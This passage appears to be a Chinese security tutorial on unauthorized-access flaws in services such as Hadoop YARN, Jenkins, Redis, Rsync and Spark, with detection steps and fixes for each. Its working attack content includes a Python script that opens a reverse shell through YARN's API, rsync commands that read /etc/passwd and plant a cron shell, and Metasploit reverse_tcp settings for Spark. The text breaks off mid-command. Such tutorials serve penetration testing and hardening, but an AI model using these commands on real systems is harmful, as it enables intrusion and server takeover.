<p>环境启动后，没有配置身份认证，可以未授权访问到Hadoop YARN ResourceManager WebUI页面。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.126.130:8088/</span><br><span class="line">http://192.168.126.130:8088/cluster</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131205268.png" alt="img"></p>
<p>利用该漏洞，可以进一步getshell</p>
<p><img src="/Image-Chinese%5C20241017131205272.png" alt="img"></p>
<p>脚本源码如下：rce.py</p>
<p>python</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://192.168.126.130:8088/&#x27;</span> <span class="comment"># 设置目标主机的ip地址</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.126.128&#x27;</span> <span class="comment"># 设置你攻击主机的监听ip地址，并且监听端口为9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/  -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>

<h3 id="3-漏洞修复-8"><a href="#3-漏洞修复-8" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>升级Hadoop到2.x版本以上，并启用Kerberos认证功能，禁止匿名访问;</li>
<li>设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口；</li>
<li>如无必要，关闭 Hadoop Web 管理页面；</li>
</ul>
<h2 id="0x11-JBoss-未授权访问"><a href="#0x11-JBoss-未授权访问" class="headerlink" title="0x11 JBoss 未授权访问"></a>0x11 JBoss 未授权访问</h2><h3 id="1-漏洞简介-9"><a href="#1-漏洞简介-9" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>漏洞简述JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问 <code>http://ip:8080/jmx-console</code> 就可以浏览 Jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。</p>
<h3 id="2-漏洞检测-9"><a href="#2-漏洞检测-9" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>直接访问 <code>http://ip:port/</code> 看是否能进入 jmx-console 和 web-console 页面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8080/</span><br><span class="line">http://ip:8080/jmx-console/</span><br><span class="line">http://ip:8080/jbossws/</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131206325.png" alt="img"></p>
<h3 id="3-漏洞修复-9"><a href="#3-漏洞修复-9" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>添加 JMX 控制页面身份认证；</li>
<li>进行JMX Console 安全配置；</li>
<li>关闭jmx-console和web-console;</li>
</ul>
<h2 id="0x12-Jenkins-未授权访问"><a href="#0x12-Jenkins-未授权访问" class="headerlink" title="0x12 Jenkins 未授权访问"></a>0x12 Jenkins 未授权访问</h2><h3 id="1-漏洞简介-10"><a href="#1-漏洞简介-10" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
<h3 id="2-漏洞检测-10"><a href="#2-漏洞检测-10" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>直接通过url输入以下地址，若能访问，证明存在未授权访问漏洞。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;target&gt;:8080/manage</span><br><span class="line">http://&lt;target&gt;:8080/script</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131206348.png" alt="img"></p>
<p>未授权访问 <code>http://&lt;target&gt;:8080/script</code> 可以执行系统命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令格式</span></span><br><span class="line">println <span class="string">&quot;whoami&quot;</span>.execute().text</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131206357.png" alt="img"></p>
<h3 id="3-漏洞修复-10"><a href="#3-漏洞修复-10" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>对后台控制页面做登录验证限制；</li>
<li>升级Jenkins至新版本；</li>
<li>禁止把Jenkins直接暴露在公网；</li>
</ul>
<h2 id="0x13-Jupyter-Notebook-未授权访问"><a href="#0x13-Jupyter-Notebook-未授权访问" class="headerlink" title="0x13 Jupyter Notebook 未授权访问"></a>0x13 Jupyter Notebook 未授权访问</h2><h3 id="1-漏洞简介-11"><a href="#1-漏洞简介-11" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p>
<h3 id="2-漏洞检测-11"><a href="#2-漏洞检测-11" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用vulhub搭建漏洞演示环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub/jupyter/notebook-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>运行后，访问<code>http://your-ip:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
<p><img src="/Image-Chinese%5C20241017131207382.png" alt="img"></p>
<p>选择 new -&gt; terminal 即可创建一个控制台：</p>
<p><img src="/Image-Chinese%5C20241017131207386.png" alt="img"></p>
<p>直接执行任意命令：</p>
<p><img src="/Image-Chinese%5C20241017131207390.png" alt="img"></p>
<h3 id="3-漏洞修复-11"><a href="#3-漏洞修复-11" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>开启身份验证，防止未经授权用户访问；</li>
<li>访问控制策略，限制IP访问，绑定固定IP；</li>
</ul>
<h2 id="0x14-Kibana-未授权访问"><a href="#0x14-Kibana-未授权访问" class="headerlink" title="0x14 Kibana 未授权访问"></a>0x14 Kibana 未授权访问</h2><h3 id="1-漏洞简介-12"><a href="#1-漏洞简介-12" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露。</p>
<h3 id="2-漏洞检测-12"><a href="#2-漏洞检测-12" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>直接访问kibana的页面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.126.130:5601/</span><br><span class="line">https://192.168.126.130/app/kibana<span class="comment">#</span></span><br><span class="line">http://192.168.126.130:5601/app/kibana<span class="comment">#/</span></span><br></pre></td></tr></table></figure>

<p>无需账号密码可以登录进入界面</p>
<p><img src="/Image-Chinese%5C20241017131207415.png" alt="img"></p>
<h3 id="3-漏洞修复-12"><a href="#3-漏洞修复-12" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>设置kibana监听本地地址，并设置ElasticSearch登录的账号和密码；</li>
<li>设置防火墙策略，限定IP访问服务；</li>
</ul>
<h2 id="0x15-Kubernetes-Api-Server-未授权"><a href="#0x15-Kubernetes-Api-Server-未授权" class="headerlink" title="0x15 Kubernetes Api Server 未授权"></a>0x15 Kubernetes Api Server 未授权</h2><h3 id="1-漏洞简介-13"><a href="#1-漏洞简介-13" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认8080）、Secure Port （默认6443）。这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限。</p>
<h3 id="2-漏洞检测-13"><a href="#2-漏洞检测-13" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务</p>
<p>端口：8080 <code>http://10.10.4.89:8080/</code></p>
<p><img src="/Image-Chinese%5C20241017131208434.png" alt="img"></p>
<p>端口：8080： api dashboard：<code>http://10.10.4.89:8080/ui</code></p>
<p><img src="/Image-Chinese%5C20241017131208438.png" alt="img"></p>
<p>端口：10250端口是kubelet API的HTTPS端口，通过路径&#x2F;pods获取环境变量、运行的容器信息、命名空间等信息。</p>
<p><img src="/Image-Chinese%5C20241017131208442.png" alt="img"></p>
<h3 id="3-漏洞修复-13"><a href="#3-漏洞修复-13" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>进行授权认证；</li>
<li>使用Service Account令牌；</li>
<li>设置防火墙策略，限定IP访问服务；</li>
</ul>
<h2 id="0x16-LDAP-未授权访问"><a href="#0x16-LDAP-未授权访问" class="headerlink" title="0x16 LDAP 未授权访问"></a>0x16 LDAP 未授权访问</h2><h3 id="1-漏洞简介-14"><a href="#1-漏洞简介-14" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>LDAP中文全称为：轻型目录访问协议（Lightweight Directory Access Protocol），默认使用389， LDAP 底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对LDAP的访问进行密码验证，导致未授权访问。</p>
<h3 id="2-漏洞检测-14"><a href="#2-漏洞检测-14" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用nmap寻找到相关的LDAP服务器，可以使用ldapbrowser直接连接，获取目录内容。</p>
<p><img src="/Image-Chinese%5C20241017131208460.png" alt="img"></p>
<h3 id="3-漏洞修复-14"><a href="#3-漏洞修复-14" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>修改ldap的acl，禁止匿名访问。</li>
<li>根据业务设置ldap访问白名单或黑名单；</li>
</ul>
<h2 id="0x17-MongoDB-未授权访问"><a href="#0x17-MongoDB-未授权访问" class="headerlink" title="0x17 MongoDB 未授权访问"></a>0x17 MongoDB 未授权访问</h2><h3 id="1-漏洞简介-15"><a href="#1-漏洞简介-15" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。</p>
<p>造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。</p>
<h3 id="2-漏洞检测-15"><a href="#2-漏洞检测-15" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>安装mongodb，然后连接到服务。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install mongodb</span><br><span class="line">mongo --host 10.2.20.34 --port 27017</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131209484.png" alt="img"></p>
<h3 id="3-漏洞修复-15"><a href="#3-漏洞修复-15" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>限制绑定IP，启动时加入参数<code>--bind_ip 127.0.0.1</code>或在<code>/etc/mongodb.conf</code>文件中添加以下内容：<code>bind_ip = 127.0.0.1</code>；</li>
<li>在<code>admin.system.users</code>中添加用户，启动认证；</li>
<li>设置防火墙策略，限定 IP 访问服务；</li>
<li>禁用HTTP和REST端口，修改配置文件或在启动的时候选择参数<code>nohttpinterface=false</code>；</li>
</ul>
<h2 id="0x18-Memcached-未授权访问"><a href="#0x18-Memcached-未授权访问" class="headerlink" title="0x18 Memcached 未授权访问"></a>0x18 Memcached 未授权访问</h2><h3 id="1-漏洞简介-16"><a href="#1-漏洞简介-16" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Memcached 端口对外开放并且没有配置认证选项，未授权用户可直接获取数据库中所有信息，造成严重的信息泄露。</p>
<h3 id="2-漏洞检测-16"><a href="#2-漏洞检测-16" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>无需用户名密码，可以直接连接memcache 服务的11211端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.10.4.89 11211</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">nc -vv 11211</span><br></pre></td></tr></table></figure>

<p>使用了 stats 命令来输出 Memcached 服务信息</p>
<p><img src="/Image-Chinese%5C20241017131209511.png" alt="img"></p>
<h3 id="3-漏洞修复-16"><a href="#3-漏洞修复-16" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>修改绑定的IP、端口和指定访问者IP；</li>
<li>设置防火墙策略；</li>
<li>禁止暴露在公网；</li>
<li>配置memcached监听本地回环地址 <code>127.0.0.1</code>；</li>
</ul>
<h2 id="0x19-NFS-未授权访问"><a href="#0x19-NFS-未授权访问" class="headerlink" title="0x19 NFS 未授权访问"></a>0x19 NFS 未授权访问</h2><h3 id="1-漏洞简介-17"><a href="#1-漏洞简介-17" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Network File System(NFS)，是由SUN公司研制的UNIX表示层协议(pressentation layer protocol)，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏。</p>
<h3 id="2-漏洞检测-17"><a href="#2-漏洞检测-17" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装nfs客户端</span></span><br><span class="line">apt install nfs-common</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看nfs服务器上的共享目录</span></span><br><span class="line">showmount -e 192.168.126.130 </span><br><span class="line"></span><br><span class="line"><span class="comment">#挂载相应共享目录到本地</span></span><br><span class="line">mount -t nfs 192.168.126.130:/grdata /mnt </span><br><span class="line"></span><br><span class="line"><span class="comment">#卸载目录</span></span><br><span class="line">umount /mnt</span><br></pre></td></tr></table></figure>

<h3 id="3-漏洞修复-17"><a href="#3-漏洞修复-17" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>利用iptables限制端口2049和20048端口的访问，禁止外部访问；</li>
<li>设置&#x2F;etc&#x2F;exports，对访问进行控制；</li>
</ul>
<h2 id="0x20-Rsync-未授权访问"><a href="#0x20-Rsync-未授权访问" class="headerlink" title="0x20 Rsync 未授权访问"></a>0x20 Rsync 未授权访问</h2><h3 id="1-漏洞简介-18"><a href="#1-漏洞简介-18" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>rsync是Linux&#x2F;Unix下的一个远程数据同步工具，可通过LAN&#x2F;WAN快速同步多台主机间的文件和目录，默认运行在873端口。由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件。</p>
<h3 id="2-漏洞检测-18"><a href="#2-漏洞检测-18" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用vulhub搭建漏洞演示环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub/rsync/common</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>使用Rsync命令即可进行检测。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync://192.168.126.130:873/</span><br><span class="line">rsync rsync://192.168.126.130:873/src</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131209570.png" alt="img"></p>
<p>利用rsync下载任意文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync://192.168.126.130:873/src/etc/passwd ./</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131209578.png" alt="img"></p>
<p>或者写入任意文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av shell rsync://192.168.126.130:873/src/etc/cron.d/shell</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131210586.png" alt="img"></p>
<h3 id="3-漏洞修复-18"><a href="#3-漏洞修复-18" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>隐藏 module 信息：修改配置文件 list &#x3D;false。</li>
<li>权限控制：不需要写入权限的 module 的设置为只读 Read only &#x3D; true;</li>
<li>网络访问控制：使用安全组策略或白名单限制，只允许必要访问的主机访问;</li>
<li>账户认证：只允许指定的用户利用指定的密码使用 rsync 服务;</li>
<li>数据加密传输：Rsync 默认没有直接支持加密传输，如果需要 Rsync 同步重要性很高的数据，可以使用 ssh;</li>
</ul>
<blockquote>
<p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/202771.html">https://www.freebuf.com/column/202771.html</a></p>
</blockquote>
<h2 id="0x21-Redis-未授权访问"><a href="#0x21-Redis-未授权访问" class="headerlink" title="0x21 Redis 未授权访问"></a>0x21 Redis 未授权访问</h2><h3 id="1-漏洞简介-19"><a href="#1-漏洞简介-19" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器。</p>
<p>Redis未授权访问在4.x&#x2F;5.0.5以前版本下，可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令。</p>
<h3 id="2-漏洞检测-19"><a href="#2-漏洞检测-19" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>kali安装redis-cli远程连接工具</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class="line">tar -zxvf redis-stable.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-stable </span><br><span class="line">make </span><br><span class="line"><span class="built_in">cp</span> src/redis-cli /usr/bin/</span><br><span class="line">redis-cli -h</span><br></pre></td></tr></table></figure>

<p>使用redis-cli命令直接远程免密登录redis主机</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 目标主机IP</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131210625.png" alt="img"></p>
<h3 id="3-漏洞修复-19"><a href="#3-漏洞修复-19" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>禁止使用root权限启动redis服务；</li>
<li>对redis访问启动密码认证；</li>
<li>添加IP访问限制，并更改默认6379端口；</li>
</ul>
<h2 id="0x22-RabbitMQ-未授权访问"><a href="#0x22-RabbitMQ-未授权访问" class="headerlink" title="0x22 RabbitMQ 未授权访问"></a>0x22 RabbitMQ 未授权访问</h2><h3 id="1-漏洞简介-20"><a href="#1-漏洞简介-20" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。 消息可以是人类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。</p>
<h3 id="2-漏洞检测-20"><a href="#2-漏洞检测-20" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>默认账号密码都是guest</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.4.89:15672</span><br><span class="line">http://10.10.4.89:25672/</span><br><span class="line">http://10.10.4.89:15692/</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131210649.png" alt="img"></p>
<h3 id="3-漏洞修复-20"><a href="#3-漏洞修复-20" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>修改为强密码，删除默认的账号guest；</li>
<li>禁止对外网开放，仅限于内部访问；</li>
</ul>
<h2 id="0x23-Solr-未授权访问"><a href="#0x23-Solr-未授权访问" class="headerlink" title="0x23 Solr 未授权访问"></a>0x23 Solr 未授权访问</h2><h3 id="1-漏洞简介-21"><a href="#1-漏洞简介-21" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell。</p>
<h3 id="2-漏洞检测-21"><a href="#2-漏洞检测-21" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>敏感目录扫描时加上一条 &#x2F;solr&#x2F;admin</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.com/solr/admin</span><br><span class="line">https://xx.xx.com/solr/admin</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131211671.png" alt="img"></p>
<h3 id="3-漏洞修复-21"><a href="#3-漏洞修复-21" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>配置solr访问控制权限；</li>
<li>禁止将solr暴露在公网；</li>
</ul>
<h2 id="0x24-SpringBoot-Actuator-未授权访问"><a href="#0x24-SpringBoot-Actuator-未授权访问" class="headerlink" title="0x24 SpringBoot Actuator 未授权访问"></a>0x24 SpringBoot Actuator 未授权访问</h2><h3 id="1-漏洞简介-22"><a href="#1-漏洞简介-22" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。</p>
<h3 id="2-漏洞检测-22"><a href="#2-漏洞检测-22" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>直接访问相关路径：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.20.48/autoconfig</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">URL路径</th>
<th align="left">功能描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">get</td>
<td align="left">&#x2F;autoconfig</td>
<td align="left">提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</td>
</tr>
<tr>
<td align="left">get</td>
<td align="left">&#x2F;configprops</td>
<td align="left">描述配置属性（包含默认值）如何注入 Bean</td>
</tr>
<tr>
<td align="left">get</td>
<td align="left">&#x2F;beans</td>
<td align="left">描述应用程序上下文里全部的 Bean，以及它们的关系</td>
</tr>
<tr>
<td align="left">get</td>
<td align="left">&#x2F;dump</td>
<td align="left">获取线程活动的快照</td>
</tr>
<tr>
<td align="left">get</td>
<td align="left">&#x2F;env</td>
<td align="left">获取全部环境属性</td>
</tr>
<tr>
<td align="left">get</td>
<td align="left">&#x2F;env&#x2F;{name}</td>
<td align="left">根据名称获取特定的环境属性值</td>
</tr>
<tr>
<td align="left">get</td>
<td align="left">&#x2F;health</td>
<td align="left">报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供</td>
</tr>
<tr>
<td align="left">get</td>
<td align="left">&#x2F;info</td>
<td align="left">获取应用程序的定制信息，这些信息由 info 打头的属性提供</td>
</tr>
<tr>
<td align="left">get</td>
<td align="left">&#x2F;mappings</td>
<td align="left">描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系</td>
</tr>
<tr>
<td align="left">get</td>
<td align="left">&#x2F;metrics</td>
<td align="left">报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数</td>
</tr>
<tr>
<td align="left">get</td>
<td align="left">&#x2F;metrics&#x2F;{name}</td>
<td align="left">报告指定名称的应用程序度量值</td>
</tr>
<tr>
<td align="left">post</td>
<td align="left">&#x2F;shutdown</td>
<td align="left">关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）</td>
</tr>
<tr>
<td align="left">get</td>
<td align="left">&#x2F;trace</td>
<td align="left">提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）</td>
</tr>
</tbody></table>
<h3 id="3-漏洞修复-22"><a href="#3-漏洞修复-22" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>禁用&#x2F;env接口；</li>
<li>升级到SpringBoot Actuator 2.0；</li>
<li>禁止对外开放；</li>
</ul>
<h2 id="0x25-Spark-未授权访问"><a href="#0x25-Spark-未授权访问" class="headerlink" title="0x25 Spark 未授权访问"></a>0x25 Spark 未授权访问</h2><h3 id="1-漏洞简介-23"><a href="#1-漏洞简介-23" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动访问控制，攻击者可以在集群中执行任意代码。该漏洞的本质是未授权用户可以向Master节点提交一个应用，Master节点会分发给Slave节点执行应用。如果应用中包含恶意代码，会导致任意代码执行，威胁Spark集群整体的安全性。</p>
<h3 id="2-漏洞检测-23"><a href="#2-漏洞检测-23" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>nmap扫描出如下端口开放，则很有可能存在漏洞</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6066/tcp  open  http           Jetty 9.3.z-SNAPSHOT</span><br><span class="line">8081/tcp  open  http           Jetty 9.3.z-SNAPSHOT</span><br><span class="line">8082/tcp  open  http           Jetty 9.3.z-SNAPSHOT</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131211730.png" alt="img"></p>
<p>使用msf工具getshell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt;use exploit/linux/http/spark_unauth_rce</span><br><span class="line">msf5&gt;<span class="built_in">set</span> payload java/meterpreter/reverse_tcp</span><br><span class="line">msf5&gt;<span class="built_in">set</span> rhost 192.168.100.2</span><br><span class="line">msf5&gt;<span class="built_in">set</span> rport 6066</span><br><span class="line">msf5&gt;<span class="built_in">set</span> lhost 192.168.100.1</span><br><span class="line">msf5&gt;<span class="built_in">set</span> lport 4444</span><br><span class="line">msf5&gt;<span class="built_in">set</span> srvhost 192.168.100.1</span><br><span class="line">msf5&gt;<span 